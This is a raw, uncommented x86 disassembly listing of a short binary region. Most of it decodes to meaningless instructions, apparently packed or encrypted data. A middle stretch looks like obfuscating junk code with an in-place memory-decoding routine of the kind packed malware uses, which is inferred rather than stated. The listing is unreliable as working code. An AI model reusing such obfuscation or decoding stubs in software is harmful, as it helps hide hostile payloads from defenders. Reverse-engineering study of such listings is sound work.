  4032d6:	les    eax,FWORD PTR [esi-0x10]
  4032d9:	popf   
  4032da:	mov    al,ds:0xb6200343
  4032df:	enter  0xa2e8,0x58
  4032e3:	cld    
  4032e4:	ret    
  4032e5:	pop    ecx
  4032e6:	add    ch,BYTE PTR [ebp+0x6fe73dd9]
  4032ec:	pop    ebp
  4032ed:	mov    dh,0xa3
  4032ef:	sahf   
  4032f0:	mov    BYTE PTR [ebx],0xae
  4032f3:	and    esi,DWORD PTR [edi-0x81f9e25]
  4032f9:	scas   eax,DWORD PTR es:[edi]
  4032fa:	xchg   ebx,eax
  4032fb:	stc    
  4032fc:	mov    dl,0xf9
  4032fe:	add    cl,0x2c
  403301:	mov    ds:0x9e5bb5b1,al
  403306:	lds    eax,FWORD PTR ds:0x8ae11627
  40330c:	fldenv [edi+0x5f]
  40330f:	jbe    0x4032ec
  403311:	rcr    DWORD PTR [edx-0x43a23456],0x94
  403318:	pop    eax
  403319:	out    0x7e,al
  40331b:	xchg   esp,eax
  40331c:	js     0x4032a5
  40331e:	jmp    0x403374
  403320:	aam    0x4d
  403322:	es das 
  403324:	jge    0x403335
  403326:	sub    BYTE PTR [ebx],dl
  403328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403329:	xor    BYTE PTR [eax-0x563888bc],0x75
  403330:	jne    0x4033a4
  403332:	cmp    dh,bl
  403334:	(bad)  
  403335:	push   esi
  403336:	test   BYTE PTR [ebp+0x5a],bl
  403339:	out    0x17,al
  40333b:	test   al,0x8a
  40333d:	test   eax,0xff138204
  403342:	enter  0xa921,0xcc
  403346:	pushf  
  403347:	outs   dx,DWORD PTR ds:[esi]
  403348:	and    ebp,DWORD PTR [ecx-0xa]
  40334b:	lds    edx,FWORD PTR [bp+si]
  40334e:	pop    es
  40334f:	push   cs
  403350:	fmul   DWORD PTR [edx-0x211d5cd1]
  403356:	pusha  
  403357:	sti    
  403358:	jo     0x40330a
  40335a:	(bad)  
  40335b:	mov    esp,0x75d985ef
  403360:	(bad)  
  403361:	adc    BYTE PTR [eax+0x6773e507],ah
  403367:	in     eax,dx
  403368:	in     al,0x3a
  40336a:	and    eax,0x4f34cb3f
  40336f:	cmp    eax,esp
  403371:	mov    al,ds:0x18272fe2
  403376:	sbb    edi,eax
  403378:	jbe    0x40330d
  40337a:	retf   
  40337b:	dec    edx
  40337c:	les    ebp,FWORD PTR [edi+0x35805d55]
  403382:	outs   dx,BYTE PTR ds:[esi]
  403383:	mov    edi,0xf111360c
  403388:	fucomip st,st(5)
  40338a:	xchg   ebp,eax
  40338b:	stos   BYTE PTR es:[edi],al
  40338c:	jns    0x40337a
  40338e:	pop    ss
  40338f:	dec    ecx
  403390:	shl    DWORD PTR [eax+ebx*4],cl
  403393:	test   BYTE PTR [edi-0x3f],0xb7
  403397:	adc    bl,BYTE PTR [edi-0x10]
  40339a:	jg     0x40340b
  40339c:	sbb    al,0xa1
  40339e:	push   0xffffffed
  4033a0:	inc    ebp
  4033a1:	dec    edx
  4033a2:	scas   al,BYTE PTR es:[edi]
  4033a3:	xchg   edx,eax
  4033a4:	lds    eax,FWORD PTR [ebp+0x3d]
  4033a7:	xor    eax,0xa5b989d4
  4033ac:	mov    al,dh
  4033ae:	into   
  4033af:	retf   0x83ab
  4033b2:	push   ecx
  4033b3:	adc    edi,DWORD PTR [ebp-0x1f]
  4033b6:	push   edx
  4033b7:	or     DWORD PTR [ecx+0x37178a49],ecx
  4033bd:	mov    ds:0x86e8f971,al
  4033c2:	sbb    esi,0x10cc97b3
  4033c8:	stos   BYTE PTR es:[edi],al
  4033c9:	pop    ebp
  4033ca:	xor    ecx,DWORD PTR [eax+ebx*2-0x2b50b4f]
  4033d1:	lds    edi,FWORD PTR [ebx-0x69]
  4033d4:	sub    BYTE PTR [ebp+ebx*1-0x3f],ah
  4033d8:	nop
  4033d9:	cmp    ebx,esi
  4033db:	mov    al,0x4c
  4033dd:	sar    DWORD PTR [ecx],cl
  4033df:	mov    ds:0x370d9e42,al
  4033e4:	or     eax,ebp
  4033e6:	mov    ebp,0x25ae2ac1
  4033eb:	dec    esp
  4033ec:	fdiv   QWORD PTR [esi-0x7cbff49a]
  4033f2:	(bad)  
  4033f3:	cld    
  4033f4:	nop
  4033f5:	push   esi
  4033f6:	arpl   WORD PTR [ebp+0x6ea65412],dx
  4033fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033fd:	test   DWORD PTR [ecx],0x3fa1b5c1
  403403:	pusha  
  403404:	lods   eax,DWORD PTR ds:[esi]
  403405:	(bad)  
  403408:	mov    edx,0x456a243d
  40340d:	cli    
  40340e:	and    cl,al
  403410:	bound  ebx,QWORD PTR [eax+0xfc4b84]
  403416:	ret    
  403417:	push   edi
  403418:	sub    al,0x91
  40341a:	cmp    DWORD PTR [ebx+0x5de5cd],ebx
  403420:	lods   eax,DWORD PTR ds:[esi]
  403421:	aad    0x18
  403423:	iret   
  403424:	and    ch,BYTE PTR [eax]
  403426:	and    cl,bl
  403428:	loop   0x4033b0
  40342a:	in     al,dx
  40342b:	dec    ebx
  40342c:	xchg   edx,eax
  40342d:	aad    0x94
  40342f:	and    bh,al
  403431:	(bad)  
  403432:	or     al,0x3b
  403434:	(bad)  
  403435:	jl     0x40347c
  403437:	jecxz  0x403416
  403439:	xchg   esp,eax
  40343a:	ficomp DWORD PTR [eax]
  40343c:	mov    BYTE PTR [edi],al
  40343e:	(bad)
  403443:	test   al,0x86
  403445:	mul    ebp
  403447:	rol    DWORD PTR [esi+0x20],1
  40344a:	out    0x5c,al
  40344c:	stos   DWORD PTR es:[edi],eax
  40344d:	mov    esp,0x35272e74
  403452:	jle    0x403459
  403454:	mov    edi,0xa75ea8cf
  403459:	sbb    BYTE PTR [esi+0x5d],al
  40345c:	mov    ds:0xe732c512,al
  403461:	out    dx,al
  403462:	jmp    0xee09bad9
  403467:	sub    edi,ebx
  403469:	pop    eax
  40346a:	jne    0x403488
  40346c:	xor    DWORD PTR [edx-0x3b],ebx
  40346f:	sub    edx,DWORD PTR [ecx-0x32]
  403472:	xor    BYTE PTR [ebx-0x6bb3d98b],0x95
  403479:	push   edx
  40347a:	xchg   ebx,eax
  40347b:	sbb    bh,cl
  40347d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40347e:	test   eax,0xde4b5d23
  403483:	in     eax,0x5f
  403485:	enter  0xc4e1,0x4c
  403489:	ret    0x99a5
  40348c:	call   0xcd1c:0x7da54679
  403493:	adc    DWORD PTR [eax],ecx
  403495:	js     0x4034ac
  403497:	(bad)  
  403498:	adc    al,0x5a
  40349a:	jne    0x403497
  40349c:	mov    eax,ds:0x61ae0b74
  4034a1:	and    eax,DWORD PTR [esi]
  4034a3:	fcom   st(5)
  4034a5:	jne    0x4034be
  4034a7:	dec    ebp
  4034a8:	test   esp,esi
  4034aa:	inc    ecx
  4034ab:	mov    eax,0xfb0aaed7
  4034b0:	std    
  4034b1:	ret    0x6dbd
  4034b4:	pop    es
  4034b5:	mov    ecx,0xe8a64f85
  4034ba:	es test al,0xc1
  4034bd:	mov    ds:0x11616740,eax
  4034c2:	mov    bh,0x65
  4034c4:	(bad)  
  4034c5:	jmp    0xcc9b:0x7861fb23
  4034cc:	mov    dl,dl
  4034ce:	ret    0x9d01
  4034d1:	cmp    eax,0x43f6a2b0
  4034d6:	cwde   
  4034d7:	or     al,0x28
  4034d9:	icebp  
  4034da:	je     0x403496
  4034dc:	hlt    
  4034dd:	add    al,0x73
  4034df:	aam    0x3a
  4034e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034e2:	xlat   BYTE PTR ds:[ebx]
  4034e3:	fs mov eax,0x23a7a7ad
  4034e9:	push   edx
  4034ea:	enter  0x4a0a,0x8b
  4034ee:	dec    ebp
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x4281a3,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x29],ch
  403514:	adc    DWORD PTR [ebp+0x18e5c3b0],edi
  40351a:	sbb    BYTE PTR [esi-0x7ee7e7ee],bl
  403520:	sti    
  403521:	mov    al,ds:0xcc8bc331
  403526:	sbb    eax,0x98b02156
  40352b:	xchg   edx,eax
  40352c:	cwde   
  40352d:	mov    ecx,0x28e7e060
  403532:	or     eax,0x14
  403535:	pop    es
  403536:	mov    bl,BYTE PTR [bp-0x2d]
  40353a:	xchg   esp,eax
  40353b:	sbb    eax,0x3e9bfd27
  403540:	cdq    
  403541:	je     0x403529
  403543:	mov    dh,0x50
  403545:	jge    0x40350d
  403547:	in     al,0x35
  403549:	retf   
  40354a:	test   eax,0xcfcbb3b4
  40354f:	aam    0x9
  403551:	jbe    0x4034e2
  403553:	xlat   BYTE PTR ds:[ebx]
  403554:	mov    eax,0x27dd8b06
  403559:	jmp    0xc950:0xd3566ce7
  403560:	lods   al,BYTE PTR ds:[esi]
  403561:	out    0x40,al
  403563:	aas    
  403564:	mov    ebp,0xde9f0c5c
  403569:	add    al,0x6e
  40356b:	push   ebp
  40356c:	test   al,0x77
  40356e:	add    cl,bh
  403570:	call   0x6f5:0xddb9eae5
  403577:	das    
  403578:	cs jl  0x403523
  40357b:	inc    ecx
  40357c:	add    eax,0x45254096
  403581:	jl     0x4035a3
  403583:	(bad)  
  403584:	jne    0x40352a
  403586:	pop    eax
  403587:	or     dl,BYTE PTR cs:[eax+0x9]
  40358b:	int3   
  40358c:	call   DWORD PTR [edx-0x7f]
  40358f:	xlat   BYTE PTR ds:[ebx]
  403590:	jmp    0xa4221555
  403595:	xlat   BYTE PTR ds:[ebx]
  403596:	(bad)  
  403597:	fmul   st(6),st
  403599:	cmp    eax,0xddfedac4
  40359e:	cmc    
  40359f:	sbb    DWORD PTR [esi+0x83b5ed0],edi
  4035a5:	punpcklbw mm6,DWORD PTR [ecx]
  4035a8:	mov    bl,0x5e
  4035aa:	mov    eax,0xc5a3daca
  4035af:	je     0x403568
  4035b1:	dec    eax
  4035b2:	pop    ecx
  4035b3:	sub    al,0x3c
  4035b5:	sub    BYTE PTR [ecx-0x2b2f69b1],0xc2
  4035bc:	(bad)  
  4035bd:	and    al,0x8d
  4035bf:	int3   
  4035c0:	or     DWORD PTR [esi+ebx*2-0xc],esi
  4035c4:	out    dx,al
  4035c5:	pushf  
  4035c6:	dec    bp
  4035c8:	ror    BYTE PTR [ebx],0x63
  4035cb:	call   0xd84e201e
  4035d0:	mov    eax,ds:0x36da0270
  4035d5:	loope  0x4035f2
  4035d7:	in     eax,dx
  4035d8:	and    eax,0x936eff23
  4035dd:	bound  edi,QWORD PTR [eax]
  4035df:	ins    BYTE PTR es:[edi],dx
  4035e0:	mov    ds:0x29dc4740,eax
  4035e5:	mov    ebx,0x1466a9a6
  4035ea:	inc    edi
  4035eb:	or     cl,BYTE PTR [esi]
  4035ed:	sar    BYTE PTR [edi],1
  4035ef:	dec    edx
  4035f0:	xchg   ebx,eax
  4035f1:	mov    edx,0x55620bee
  4035f6:	sbb    bh,BYTE PTR [ecx+0x4d]
  4035f9:	sub    bh,ah
  4035fb:	rcl    ecx,0xd
  4035fe:	out    0x95,eax
  403600:	popa   
  403601:	push   eax
  403602:	rol    BYTE PTR [ebp+0x3ece777c],1
  403608:	adc    al,0x4b
  40360a:	push   ss
  40360b:	dec    ebp
  40360c:	imul   edx,DWORD PTR [edi-0x35],0xbd7f36c1
  403613:	xchg   ecx,eax
  403614:	inc    esp
  403615:	and    ebp,edi
  403617:	stc    
  403618:	fucomi st,st(3)
  40361a:	adc    ebx,DWORD PTR [edi+ebp*8+0x27]
  40361e:	(bad)  
  40361f:	loope  0x403695
  403621:	adc    esp,eax
  403623:	ja     0x403637
  403625:	xor    cl,al
  403627:	je     0x403643
  403629:	shl    al,0xbc
  40362c:	mov    cl,0xd8
  40362e:	jl     0x403660
  403630:	enter  0x4311,0x29
  403634:	jg     0x4035fc
  403636:	dec    esi
  403637:	push   ds
  403638:	push   edi
  403639:	jle    0x40360f
  40363b:	cmp    ch,BYTE PTR es:0x3eb16a2e
  403642:	dec    ecx
  403643:	sub    edx,edx
  403645:	std    
  403646:	(bad)  
  403647:	jns    0x403661
  403649:	stos   BYTE PTR es:[edi],al
  40364a:	arpl   WORD PTR [edx-0x18afc3e4],bx
  403650:	pop    esi
  403651:	xor    al,bl
  403653:	inc    ebp
  403654:	stc    
  403655:	popa   
  403656:	gs call 0x6fe5ffc7
  40365c:	aam    0x98
  40365e:	fcom   QWORD PTR [ebp+0x7e]
  403661:	jle    0x403692
  403663:	or     al,ch
  403665:	in     eax,0xe2
  403667:	aas    
  403668:	and    DWORD PTR [ebx-0x1da11a5d],0x4840023d
  403672:	lods   al,BYTE PTR ds:[esi]
  403673:	mov    eax,ds:0xd0971a4d
  403678:	xor    eax,0xc7a0b929
  40367d:	sub    esi,ebp
  40367f:	lds    edx,FWORD PTR [ebx-0x4b]
  403682:	sahf   
  403683:	fidivr WORD PTR [eax-0x4]
  403686:	aam    0x86
  403688:	mov    cl,0x72
  40368a:	in     eax,0xc5
  40368c:	mov    cl,0xa7
  40368e:	cmp    eax,0x4f58a4b6
  403693:	inc    esi
  403694:	or     DWORD PTR [eax],esi
  403696:	enter  0x4572,0xfc
  40369a:	inc    esi
  40369b:	call   0x56e569fa
  4036a0:	pop    edx
  4036a1:	fcomi  st,st(2)
  4036a3:	sub    eax,0xb703bae4
  4036a8:	cli    
  4036a9:	icebp  
  4036aa:	pop    ss
  4036ab:	xchg   esp,eax
  4036ac:	mov    dh,0xf6
  4036ae:	sub    ecx,DWORD PTR [ebx-0x76]
  4036b1:	add    al,0xc8
  4036b3:	rol    DWORD PTR [edi-0x54d0ca46],cl
  4036b9:	xchg   esi,eax
  4036ba:	add    al,0xcf
  4036bc:	sub    esi,DWORD PTR [ebp+0x26]
  4036bf:	mov    cs,WORD PTR [edx-0x7766ea32]
  4036c5:	out    0xe,eax
  4036c7:	mov    cs,WORD PTR [eax]
  4036c9:	push   edi
  4036ca:	gs push edx
  4036cc:	retf   
  4036cd:	test   eax,0xff20fda4
  4036d2:	mov    ah,bl
  4036d4:	retf   
  4036d5:	xchg   esi,eax
  4036d6:	mov    cl,0x8c
  4036d8:	mov    edi,0x7f2ff24c
  4036dd:	adc    BYTE PTR [ecx+0x6b],al
  4036e0:	jle    0x4036ee
  4036e2:	dec    edx
  4036e3:	sbb    al,0x23
  4036e5:	out    dx,al
  4036e6:	div    BYTE PTR [edi-0x31]
  4036e9:	push   esp
  4036ea:	push   ds
  4036eb:	scas   eax,DWORD PTR es:[edi]
  4036ec:	xchg   esi,eax
  4036ed:	aaa    
  4036ee:	push   esi
  4036ef:	pop    edi
  4036f0:	(bad)  
  4036f1:	add    ch,dh
  4036f3:	dec    edx
  4036f4:	pop    edx
  4036f5:	pusha  
  4036f6:	or     eax,0x352c13c0
  4036fb:	scas   eax,DWORD PTR es:[edi]
  4036fc:	jmp    0x403702
  4036fe:	ds sub al,0x49
  403702:	xchg   ecx,eax
  403703:	dec    esp
  403704:	(bad)  
  403705:	clc    
  403706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403707:	mov    ebx,0x79658e6b
  40370c:	jae    0x40371f
  40370e:	jg     0x403755
  403710:	inc    ebp
  403711:	sub    eax,edi
  403713:	imul   ecx,DWORD PTR [ebx-0x59],0x4c
  403717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403718:	jb     0x4036e6
  40371a:	dec    ebx
  40371b:	mov    edi,0xe9141517
  403720:	fcomp  DWORD PTR [ecx-0x39764b55]
  403726:	lock call 0x67f6:0xd8d70a6a
  40372e:	mov    dh,cl
  403730:	test   DWORD PTR [edi+0x5d],esp
  403733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403734:	rcl    BYTE PTR [ebx+0x4a],cl
  403737:	das    
  403738:	(bad)  
  40373a:	arpl   WORD PTR [esi+0x239a42d8],dx
  403740:	rol    DWORD PTR [edi-0x28ad4296],0xea
  403747:	mov    eax,0xc64e480d
  40374c:	mov    dh,0x1d
  40374e:	jnp    0x4037b3
  403750:	cmc    
  403751:	ret    
  403752:	xor    al,BYTE PTR [edi+eiz*8]
  403755:	xchg   ebx,eax
  403756:	pop    ebx
  403757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403758:	fcomp  DWORD PTR [ecx+0x2a0132f4]
  40375e:	cmp    BYTE PTR [edi+0x67],dl
  403761:	jne    0x40375a
  403763:	cmp    BYTE PTR [eax+0x73ca5206],ch
  403769:	cwde   
  40376a:	lahf   
  40376b:	sbb    DWORD PTR [ecx+0x527f4c5b],ebp
  403771:	std    
  403772:	jmp    0xa333d1c5
  403777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403778:	lahf   
  403779:	sti    
  40377a:	mov    dh,0x8e
  40377c:	xor    ebp,DWORD PTR [ebx]
  40377e:	lods   eax,DWORD PTR ds:[esi]
  40377f:	cmp    eax,0x40346e19
  403784:	cli    
  403785:	cmp    BYTE PTR [ebp-0x15ac1c41],al
  40378b:	push   ds
  40378c:	shl    BYTE PTR [eax+0x37775a95],0x8
  403793:	sbb    edi,ebx
  403795:	call   0x4c99:0xa76af62e
  40379c:	jmp    0x18bc:0x30406609
  4037a3:	test   ecx,esp
  4037a5:	pushf  
  4037a6:	and    eax,0x74c32f1b
  4037ab:	out    dx,al
  4037ac:	nop
  4037ad:	adc    eax,0xa26127b3
  4037b2:	fs mov dh,0x19
  4037b5:	aas    
  4037b6:	rol    dl,cl
  4037b8:	daa    
  4037b9:	into   
  4037ba:	xchg   edi,eax
  4037bb:	mov    ds:0x47359940,al
  4037c0:	xchg   BYTE PTR [ebx-0x7ab4757a],bl
  4037c6:	loop   0x40378b
  4037c8:	inc    ebx
  4037c9:	pop    ebp
  4037ca:	dec    eax
  4037cb:	std    
  4037cc:	inc    ebp
  4037cd:	push   ebp
  4037ce:	mov    BYTE PTR [eax+ecx*1],bl
  4037d1:	out    dx,eax
  4037d2:	sub    bh,BYTE PTR [ebx+0x42]
  4037d5:	arpl   WORD PTR fs:[ebp+0x5],dx
  4037d9:	sub    edx,DWORD PTR [esi+0xc5e4408]
  4037df:	dec    edx
  4037e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037e1:	mul    DWORD PTR [edi]
  4037e3:	push   esi
  4037e4:	pop    ss
  4037e5:	adc    edx,DWORD PTR [ebx+eiz*1]
  4037e8:	in     eax,dx
  4037e9:	xchg   ebp,eax
  4037ea:	pop    ds
  4037eb:	sahf   
  4037ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ed:	add    al,0xa9
  4037ef:	aas    
  4037f0:	icebp  
  4037f1:	or     DWORD PTR [edi-0x66af69aa],edi
  4037f7:	dec    edi
  4037f8:	cli    
  4037f9:	dec    ebp
  4037fa:	mov    cl,0xb5
  4037fc:	sbb    eax,0xd99c3b76
  403801:	fstp   QWORD PTR [edi+0x7f2a3255]
  403807:	dec    ebx
  403808:	sub    bl,dl
  40380a:	outs   dx,BYTE PTR ds:[esi]
  40380b:	das    
  40380c:	in     eax,0x7c
  40380e:	out    dx,eax
  40380f:	mov    eax,ds:0xfd3bda6b
  403814:	push   0xea79bfea
  403819:	mov    ds:0x3036ad40,eax
  40381e:	pinsrw mm2,WORD PTR ds:0x631afcba,0x0
  403826:	sbb    edi,0xb5518f5b
  40382c:	nop
  40382d:	cli    
  40382e:	push   esp
  40382f:	cwde   
  403830:	aad    0xe
  403832:	rol    DWORD PTR [edx],cl
  403834:	in     eax,0x2e
  403836:	sub    ebp,ebx
  403838:	push   es
  403839:	jp     0x40385e
  40383b:	jae    0x40389c
  40383d:	cmc    
  40383e:	jb     0x40388a
  403840:	clc    
  403841:	fs (bad) 
  403844:	test   al,0xdf
  403846:	push   ss
  403847:	sub    bh,BYTE PTR [ebp+0x58]
  40384a:	nop
  40384b:	fcom   QWORD PTR [edx-0x1e]
  40384e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40384f:	iret   
  403850:	sub    DWORD PTR [edx+0x46e62411],eax
  403856:	mov    dh,0xcf
  403858:	cmp    esi,DWORD PTR [ebp+0x7a]
  40385b:	sbb    bh,dh
  40385d:	jecxz  0x4038d2
  40385f:	jb     0x40381a
  403861:	xchg   ecx,eax
  403862:	xor    bl,BYTE PTR [edx]
  403864:	dec    eax
  403865:	push   0x1f
  403867:	push   ebp
  403868:	mov    ds:0xf9d31982,al
  40386d:	push   cs
  40386e:	mov    dl,0x54
  403870:	cli    
  403871:	fisttp DWORD PTR [ecx+0x74f8080c]
  403877:	into   
  403878:	retf   0xa252
  40387b:	iret   
  40387c:	ja     0x403886
  40387e:	jbe    0x4038d6
  403880:	jecxz  0x403848
  403882:	mov    ebp,0x4e131d57
  403887:	pop    edx
  403888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403889:	xchg   esp,eax
  40388a:	mov    ecx,0xa4083898
  403890:	mov    dl,dl
  403892:	mul    DWORD PTR [ecx-0x17]
  403895:	loopne 0x4038b0
  403897:	or     DWORD PTR [ecx+0x6e],ecx
  40389a:	lea    ecx,[eax]
  40389c:	arpl   WORD PTR [eax-0x218f86c2],ax
  4038a2:	jns    0x40391e
  4038a4:	cmp    bl,bh
  4038a6:	push   ecx
  4038a7:	dec    esp
  4038a8:	fwait
  4038a9:	sbb    al,ah
  4038ab:	or     al,BYTE PTR [edi]
  4038ad:	push   ebx
  4038ae:	sbb    DWORD PTR [ebx+0x2b],ecx
  4038b1:	add    al,0x9c
  4038b3:	pop    ds
  4038b4:	xor    al,0x1f
  4038b6:	sbb    DWORD PTR [esi+0x234a8d98],esp
  4038bc:	test   al,0x2f
  4038be:	inc    ecx
  4038bf:	dec    ebp
  4038c0:	and    BYTE PTR [ebx],al
  4038c2:	jnp    0x40391f
  4038c4:	and    edi,DWORD PTR [ebp+0x24e7a9a]
  4038ca:	jns    0x403913
  4038cc:	sbb    edx,DWORD PTR [edx+ebp*4+0x1d]
  4038d0:	std    
  4038d1:	repz ds pop edx
  4038d4:	mov    ecx,DWORD PTR [edx+0x3781bd51]
  4038da:	lds    ebp,FWORD PTR [ebx-0x7c]
  4038dd:	ret    0x2fb1
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	cmp    DWORD PTR ds:0x4282a3,0x0
  4038ea:	not    DWORD PTR ds:0x42819b
  4038f0:	mov    ecx,DWORD PTR ds:0x4282c7
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x4282a3,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428f18
  403913:	xor    edx,DWORD PTR ds:0x42828f
  403919:	neg    DWORD PTR ds:0x4282a3
  40391f:	xor    DWORD PTR ds:0x428197,0x12a5
  403929:	and    DWORD PTR ds:0x4283e7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x4282cb
  403939:	or     ecx,DWORD PTR ds:0x42827f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x4281a3,0x0
  403949:	mov    DWORD PTR ds:0x4283e7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x4281a3,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dec
  40397f:	adc    DWORD PTR ds:0x4282d7,0x4281bf
  403989:	sbb    DWORD PTR ds:0x4282c3,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x4283c3
  403999:	or     DWORD PTR ds:0x42829f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x4282c7
  4039a7:	adc    edx,DWORD PTR ds:0x4282ab
  4039ad:	mov    DWORD PTR ds:0x4282c7,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42827f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282e7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282db,0x4283e7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x4281bb
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428197,0x42835f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x4281a3,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42819b,0x428333
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x4282af,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x4282c7,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428197,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x4282c3,0x0
  403a3e:	mov    DWORD PTR ds:0x42834f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283e7
  403a57:	cmp    DWORD PTR ds:0x4282c3,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428dc8
  403a6f:	mov    edx,DWORD PTR ds:0x42837f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428413
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x4281c3,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x4281b7,0x2089
  403aa2:	or     DWORD PTR ds:0x42819b,0x113b
  403aac:	mov    eax,ds:0x422410
  403ab1:	cmp    DWORD PTR ds:0x4281c3,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42828f
  403ac3:	mov    DWORD PTR ds:0x428273,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428363,0x6b1a
  403adc:	mov    DWORD PTR ds:0x4281c3,0x1226
  403ae6:	cmp    DWORD PTR ds:0x4281c3,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428163
  403af8:	call   DWORD PTR ds:0x428df0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42828b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x4282cf,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x4283bb,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x4281ab,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x6af62c5a
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x76181812],bl
  403b4b:	(bad)  
  403b4c:	xchg   edi,eax
  403b4d:	sub    BYTE PTR [ebp-0x468bd6d],dl
  403b53:	mov    ah,0x9e
  403b55:	fbstp  TBYTE PTR [edx-0x3a8201f5]
  403b5b:	je     0x403ba1
  403b5d:	inc    eax
  403b5e:	jbe    0x403b7c
  403b60:	test   eax,0x892bad1c
  403b65:	adc    DWORD PTR [ebx],esp
  403b67:	loopne 0x403b48
  403b69:	dec    ecx
  403b6a:	xchg   ebx,eax
  403b6b:	or     ebx,DWORD PTR [esi+esi*2+0x76]
  403b6f:	add    cl,bl
  403b71:	mov    bl,0x17
  403b73:	push   eax
  403b74:	fild   QWORD PTR [edi+0x49]
  403b77:	rcl    BYTE PTR [esp+ecx*4+0x39e6adc4],cl
  403b7e:	je     0x403b77
  403b80:	jno    0x403bd1
  403b82:	daa    
  403b83:	mov    al,ds:0xa0e20733
  403b88:	hlt    
  403b89:	aad    0xa5
  403b8b:	lahf   
  403b8c:	adc    BYTE PTR [esi-0x59f6be19],ch
  403b92:	fsubp  st(3),st
  403b94:	arpl   WORD PTR [eax],bx
  403b96:	sahf   
  403b97:	out    0xa6,eax
  403b99:	xchg   esp,eax
  403b9a:	cmp    ah,ch
  403b9c:	pop    ebp
  403b9d:	add    al,0x3f
  403b9f:	adc    esp,DWORD PTR [edi]
  403ba1:	out    0xeb,al
  403ba3:	inc    ebx
  403ba4:	cmp    eax,0x43a46b9a
  403ba9:	fwait
  403baa:	nop
  403bab:	bound  ebx,QWORD PTR [eax-0x64]
  403bae:	ret    0x88b3
  403bb1:	neg    DWORD PTR [edi-0x13]
  403bb4:	(bad)  
  403bb5:	sub    ch,dl
  403bb7:	retf   
  403bb8:	and    bh,BYTE PTR [edx+eax*1-0x21]
  403bbc:	iret   
  403bbd:	outs   dx,DWORD PTR ds:[esi]
  403bbe:	lods   al,BYTE PTR ds:[esi]
  403bbf:	and    al,0x8c
